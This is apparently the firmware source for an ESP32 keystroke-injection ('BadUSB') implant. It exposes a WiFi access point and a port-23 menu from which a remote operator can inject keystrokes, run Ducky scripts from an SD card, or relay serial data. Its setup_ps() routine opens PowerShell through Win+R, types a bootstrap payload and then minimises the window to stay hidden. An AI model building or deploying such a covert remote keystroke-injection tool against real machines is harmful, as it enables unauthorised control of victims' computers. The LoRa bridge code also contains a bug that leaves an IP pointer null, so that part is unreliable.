#include "Arduino.h"
#include "SD_MMC.h"
#include "logo.h"
#include "lv_driver.h"
#include "pin_config.h"
#include "esp_wifi.h"

/* external library */
/* To use Arduino, you need to place lv_conf.h in the \Arduino\libraries directory */
#include "OneButton.h" // https://github.com/mathertel/OneButton
#include "TFT_eSPI.h"  // https://github.com/Bodmer/TFT_eSPI

#include "lv_conf.h"
#include "lvgl.h"    // https://github.com/lvgl/lvgl
#include <FastLED.h> // https://github.com/FastLED/FastLED

#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

#include <WiFi.h>
#include <WiFiAP.h>
#include <WiFiClient.h>


#include "arducky.h"

// Should we include LoRa bridge support?
#define LORA_BRIDGE_ENABLED
#define LORA_PORT 4403

#ifdef LORA_BRIDGE_ENABLED
#include "LoraWifiBridgeClient.h"
#endif

// Serial globals

// #if ARDUINO_USB_CDC_ON_BOOT
// #define HWSerial Serial0
// #define USBSerial Serial
// #else
#define HWSerial Serial
USBCDC USBSerial2;
//#endif

// USB globals
USBHIDKeyboard keyboard;
USBHIDMouse mouse;

// Wifi Globals
char ssid[25]; // sside generated in sprintf in setup()
const char *password = "thisisthepassword"; // after updating to esp32 2.0.14 this password needs to be longer than "thepassword". Dunno why.

WiFiServer server(23);

// Screen globals
LV_IMG_DECLARE(avatargif);
TFT_eSPI tft = TFT_eSPI();
CRGB leds;
OneButton button(BTN_PIN, true);
uint8_t btn_press = 0;
lv_obj_t *label;

// state machine globals
enum RJ_STATE {
  MENU_STATE = 0,
  PAYLOAD_STATE,
  KEYBOARD_STATE,
  SERIAL_STATE,
  DUCKY_STATE, // input for ducky
  DUCKY_EXE_STATE // running ducky script
};

RJ_STATE state = MENU_STATE;

void led_task(void *param) {
  while (1) {
    static uint8_t hue = 0;
    leds = CHSV(hue++, 0XFF, 100);
    FastLED.show();
    delay(50);
  }
}

#define PRINT_STR(str, x, y)                                                                                                                         \
  do {                                                                                                                                               \
    Serial.println(str);                                                                                                                             \
    tft.drawString(str, x, y);                                                                                                                       \
    y += 8;                                                                                                                                          \
  } while (0);

char label_text[255];
void refresh_label_text() {
  label_text[0]='\0';
  strcat(label_text, ssid);
  strcat(label_text, "\n");
  IPAddress myIP = WiFi.softAPIP();
  strcat(label_text, myIP.toString().c_str());
}
void sd_init(void) {
  int32_t x, y;
  SD_MMC.setPins(SD_MMC_CLK_PIN, SD_MMC_CMD_PIN, SD_MMC_D0_PIN, SD_MMC_D1_PIN, SD_MMC_D2_PIN, SD_MMC_D3_PIN);
  if (!SD_MMC.begin()) {
    PRINT_STR("Card Mount Failed", x, y)
    return;
  }
  uint8_t cardType = SD_MMC.cardType();

  if (cardType == CARD_NONE) {
    PRINT_STR("No SD_MMC card attached", x, y)
    return;
  }
  String str;
  str = "SD_MMC Card Type: ";
  if (cardType == CARD_MMC) {
    str += "MMC";
  } else if (cardType == CARD_SD) {
    str += "SD_MMCSC";
  } else if (cardType == CARD_SDHC) {
    str += "SD_MMCHC";
  } else {
    str += "UNKNOWN";
  }

  PRINT_STR(str, x, y)
  uint32_t cardSize = SD_MMC.cardSize() / (1024 * 1024);

  str = "SD_MMC Card Size: ";
  str += cardSize;
  PRINT_STR(str, x, y)

  str = "Total space: ";
  str += uint32_t(SD_MMC.totalBytes() / (1024 * 1024));
  str += "MB";
  PRINT_STR(str, x, y)

  str = "Used space: ";
  str += uint32_t(SD_MMC.usedBytes() / (1024 * 1024));
  str += "MB";
  PRINT_STR(str, x, y)
}

void setup() {
  HWSerial.begin(115200);
  pinMode(TFT_LEDA_PIN, OUTPUT);

  // init USB HID
  // initialize control over the keyboard:
  keyboard.begin();
  mouse.begin();
  USBSerial2.begin();
  USB.begin();

  // Initialise TFT
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  digitalWrite(TFT_LEDA_PIN, 0);
  tft.setTextFont(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
 

  // wifi AP setup
  uint32_t low     = ESP.getEfuseMac() & 0xFFFFFFFF; 
  uint32_t high    = ( ESP.getEfuseMac() >> 32 ) % 0xFFFFFFFF;
  uint64_t fullMAC = word(low,high);

  // just want to have some ID to hopefully avoid SSID colision at conferences. 
  // hopefully this is good enough *shrug*
  uint16_t small_id = high & 0xFFFF;

  snprintf(ssid, 23, "hax-%X", small_id);
  if (!WiFi.softAP(ssid, password)) {
    log_e("Soft AP creation failed.");
    keyboard.print("SoftAP creation failed :( ");
    while (1);
  }
  IPAddress myIP = WiFi.softAPIP();
  server.begin();

  // BGR ordering is typical
  // --- Uncomment for shiny LEDs ---
  FastLED.addLeds<APA102, LED_DI_PIN, LED_CI_PIN, BGR>(&leds, 1);
  xTaskCreatePinnedToCore(led_task, "led_task", 1024, NULL, 1, NULL, 0);

  lvgl_init();

  lv_obj_t* screen = lv_scr_act();


  /* just show the logo gif */
  lv_obj_set_style_bg_color(screen, lv_color_black(),0);
  lv_obj_t *img = lv_gif_create(screen);
  lv_obj_set_size(img, 60, 80);
  lv_gif_set_src(img, &avatargif);
  lv_obj_set_pos(img, 0, 0);

  label = lv_label_create(screen);
  refresh_label_text();
  lv_label_set_text(label, label_text);
  lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_CENTER, 0);
  lv_obj_set_pos(label, 65, 15);

  button.attachClick([] { setup_ps(); });

  // Init SD card
  sd_init();
  delay(3000); // delay for 3 seconds so we can read SD mount info. Comment out if you don't care
}

// set to 0 to help see whats going on. set to 1 to be stealthy
#define BE_STEALTHY 1
void setup_ps() {

  keyboard.press(KEY_LEFT_GUI);
  keyboard.press('r');
  delay(10);
  keyboard.releaseAll();
  delay(500);

  keyboard.print("powershell");
  delay(100);
  keyboard.press(KEY_RETURN);
  delay(100);
  keyboard.releaseAll();
  delay(1200);

  keyboard.print(bootstrap_ps);

  if (BE_STEALTHY) {
    keyboard.print("clear");
    keyboard.print(small_window);
    keyboard.press(KEY_LEFT_ALT);
    keyboard.press(' ');
    delay(100);
    keyboard.releaseAll();
    delay(10);
    keyboard.write('n');
  }
}
#define MAX_FILE_LEVELS 5
void listDir(WiFiClient *client, fs::FS &fs, const char *dirname, uint8_t cur_level) {
  Serial.printf("Listing directory: %s\n", dirname);

  File root = fs.open(dirname);
  if (!root) {
    client->write("Failed to open directory");
    return;
  }
  if (!root.isDirectory()) {
    client->write("Not a directory");
    return;
  }

  File file = root.openNextFile();
  while (file) {
    const char *filename = file.name();
    // skip hidden files
    if(filename[0] != '.') { 
      for(short i=0; i < cur_level; i++){
          client->write("-");
        }
        client->write(" ");
        client->write(filename);
        client->write("\n");
        if (file.isDirectory() && cur_level <= MAX_FILE_LEVELS) {
              listDir(client, fs, file.path(), cur_level + 1);
        }
    }
    file = root.openNextFile();
  }
  client->write("\n");
}

void write_to_screen(const char *label1_text) {
  lv_label_set_text(label, label1_text);
}


void handle_user_input(const char *input, WiFiClient *client) {
  // escape logic
  if(state != MENU_STATE && (strcmp(input, "radio jack off\r\n") == 0 ||  strcmp(input, "radio jack off\n") == 0)) {
       client->write("entering menu state\n");
       state = MENU_STATE;
       write_to_screen("MENU");
  }

  switch(state) {
    case MENU_STATE:
      if(strcmp(input, "payload\r\n") == 0 || strcmp(input, "payload\n") == 0) {
        state = PAYLOAD_STATE;
        setup_ps();
        client->write("payload delivered\n");
        state = MENU_STATE;
      } else if(strcmp(input, "ducky\r\n") == 0 || strcmp(input, "ducky\n") == 0) {
        client->write("Entering ducky mode \n");
        listDir(client, SD_MMC, (const char*) "/", 0);
        client->write("Which ducky file to run? (don't forget the leading /)");
        state = DUCKY_STATE;
      } else if(strcmp(input, "keyboard\r\n") == 0 || strcmp(input, "keyboard\n") == 0) {
        client->write("Entering keyboard mode\n");
        write_to_screen("KEYBOARD");
        state = KEYBOARD_STATE;
      } else if(strcmp(input, "serial\r\n") == 0 || strcmp(input, "serial\n") == 0) {
        client->write("Entering serial mode\n");
        write_to_screen("SERIAL");
        USBSerial2.write(" \r\n");
        state = SERIAL_STATE;
      } else {
        client->write("MENU: type 'payload', 'ducky', 'keyboard' or 'serial'. to exit a mode type 'radio jack off'\n->");
        write_to_screen("MENU-->");
        state = MENU_STATE;
      }
  
      break;

    case PAYLOAD_STATE:
         client->write("SHHHHH. still dropping payload");
    break;
    case DUCKY_STATE: { 
        client->write("running ->");
        client->write(input);
        client->write("\n");
        write_to_screen(input);
        state = DUCKY_EXE_STATE;
        char ducky_errmsg[40];
        short ducky_err = executeDucky(SD_MMC, input, keyboard, ducky_errmsg, 40);
        if(ducky_err != 0) {
          client->write(ducky_errmsg);
          client->write("\nducky failed. back to menu\n");
        } else {
            client->write("ducky ran \n");
        }
        
        state = MENU_STATE;
    }
    break;
    case DUCKY_EXE_STATE:
        client->write("QUACK. still dropping ducky payload");
    break;

    case KEYBOARD_STATE: {
#ifndef RJ_DEBUG
        size_t len = strlen(input); 
        keyboard.write((uint8_t*)input, len);
        write_to_screen("Keystrokes-->");
#else
        Serial.print("Keyboard from user: ");
        Serial.println(input);
#endif
    }
    break;

    case SERIAL_STATE:
#ifndef RJ_DEBUG
        USBSerial2.write(input);
        write_to_screen("SERIAL");
#else
        Serial.print("Serial teminal from user: ");
        Serial.println(input);
#endif
    break;

    default:
      client->write("Unknown state bro. How did you even do this?");
      write_to_screen("Unknown state");
  }
}

void service_loop() {
  lv_timer_handler();
  button.tick();
}

void handle_connected_client(WiFiClient &client) {
  if(client.connected()){
        client.write("Welcome!\n"); 
        state = MENU_STATE;
        handle_user_input(" ", &client); // print menu
        write_to_screen("Client connected");
      }

    while (client.connected()) {   // loop while the client's connected
      while (client.available()) { // if there's bytes to read from the client,
        String s = client.readString();   
        handle_user_input(s.c_str(), &client);
      }
      while (state == SERIAL_STATE && USBSerial2.available()) {
        char c = USBSerial2.read();
        client.write(c);
      }
      // service other tasks/loops
      service_loop();
    }
    // close the connection:
    client.stop();
}

#ifdef LORA_BRIDGE_ENABLED
void loop_lora_bridge() {
  if(WiFi.softAPgetStationNum() > 0) {
      wifi_sta_list_t wifi_sta_list;
      tcpip_adapter_sta_list_t adapter_sta_list;
      LoraWifiBridgeClient client;
  
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      memset(&adapter_sta_list, 0, sizeof(adapter_sta_list));
  
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      tcpip_adapter_get_sta_list(&wifi_sta_list, &adapter_sta_list);
    
      for (int i = 0; i < adapter_sta_list.num; i++) {
        tcpip_adapter_sta_info_t station = adapter_sta_list.sta[i];
        //ip_addr_t statip = static_cast<ip_addr_t>(station.ip);
        char ip_buf[18];
        char *ip_str = NULL;
        esp_ip4addr_ntoa(&(station.ip),ip_buf,18);  
        if(ip_str == NULL) {
          write_to_screen("Bad IP");
          return;
        }

        bool can_send = client.connect(ip_str, LORA_PORT);
        if (!can_send) {
          write_to_screen("No Lora");
          return;
        } 
        handle_connected_client(client);

      }
    }
}
#endif

void loop_wifi() {
  WiFiClient client = server.available(); // listen for incoming clients

  if (client) { // if you get a client,
    handle_connected_client(client);
  } 

}

void loop() { // Put your main code here, to run repeatedly:
  loop_wifi();
#ifdef LORA_BRIDGE_ENABLED
  // listen for LoRa Bridges if enabled
  loop_lora_bridge();
#endif
  service_loop();
  delay(10); // long delay when not servicing clients
}
